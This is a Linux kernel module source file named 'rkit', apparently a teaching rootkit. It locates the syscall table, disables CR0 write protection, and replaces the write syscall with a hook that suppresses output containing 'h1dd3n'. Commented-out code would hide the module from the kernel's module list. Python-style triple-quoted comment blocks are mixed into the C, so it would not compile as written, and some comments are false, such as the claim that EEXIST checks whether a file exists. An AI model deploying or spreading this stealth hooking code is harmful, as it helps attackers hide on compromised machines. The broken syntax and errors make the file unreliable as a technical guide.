#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

int rkit_init(void);
void rkit_exit(void);
module_init(rkit_init);
module_exit(rkit_exit);

#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef uint64_t psize;

"""
    asmlinkage tells your compiler to look on the CPU stack for the function parameters, 
    instead of registers.
"""
asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
"""
    ssize_t is used for functions whose return value could either be valid size (0 or greater)
    or a negative value to indicate an error.
"""
""" 
    This is a #define for some gcc magic that tells the compiler that the function should not 
    expect to find any of its arguments in registers (a common optimization), but only on 
    the CPU's stack.
"""

//Find the system calls table
psize *sys_call_table;

//This function looks for the address of the sys call table
psize **find(void) {
    psize **sctable;
    psize i = START_CHECK;

    while (i < END_CHECK) {
        sctable = (psize **) i;
        if (sctable[__NR_close] == (psize *) sys_close) {
            return &sctable[0];
        }
        i += sizeof(void *);
    }
    return NULL;
}




"""------------------SYSTEM CALLS REPLACEMENT FUNCTION------------------"""
//Sys calls that we hack

//write
asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) 
{
    int r;
    char *proc_protect = "h1dd3n";
    char *kbuff = (char *) kmalloc(256, GFP_KERNEL);
    """
        kmalloc returns physically contiguous memory, malloc does
        not guarantee anything about the physical memory mapping.

        The other main difference is that kmalloc'ed memory is
        reserved and locked, it cannot be swapped. malloc does not
        actually allocate physical memory. Physical memory gets
        mapped later, during use.

    """

    copy_from_user(kbuff, buff, 255); //Copies a block of data from user space.
    if (strstr(kbuff, proc_protect)) 
    """
        strstr looks for the first occurence of string 1, in string 2
        IT RETURNS A POINTER to the beginning of the first time it appears
    """
    {
        kfree(kbuff); // kfree frees previously allocated memory
        return EEXIST; // EEXIST checks if a file exists
    }

    """
        *o_write writes up to count bytes from the buffer pointed buff to the
        file referred to by the file descriptor fd.
    """
    r = (*o_write)(fd, buff, count); 

    //  *o_write opens the file for writing
                                    
    kfree(kbuff); 
    return r;
}

int rkit_init(void) 
{
    // rkit_init hides the kernel module

    // list_del_init(&__this_module.list);
    // kobject_del(&THIS_MODULE->mkobj.kobj);

    """ check to see whether the for sys_call_table found or not """
    if ((sys_call_table = (psize *) find())) 
    {
        printk("rkit: sys_call_table is at: %p\n", sys_call_table);
    } 
    else 
    {
        printk("rkit: sys_call_table not found\n");
    }

    """ 
        Disable the write protect in cr0. When set, Write Protect 
        (bit 16 of CR0) inhibits supervisor-level procedures from 
        writing into read-only pages; when clear, allows 
        supervisor-level procedures to write into read-only pages
    """
    write_cr0(read_cr0() & (~ 0x10000));

    """ write hack of the function"""
    o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);

    """ turns the sys call table protection back on """
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

void rkit_exit(void) {

    """ change back to before rooty execution """
    write_cr0(read_cr0() & (~ 0x10000));
    xchg(&sys_call_table[__NR_write], (psize)o_write);
    write_cr0(read_cr0() | 0x10000);
    printk("rkit: Module unloaded\n");
}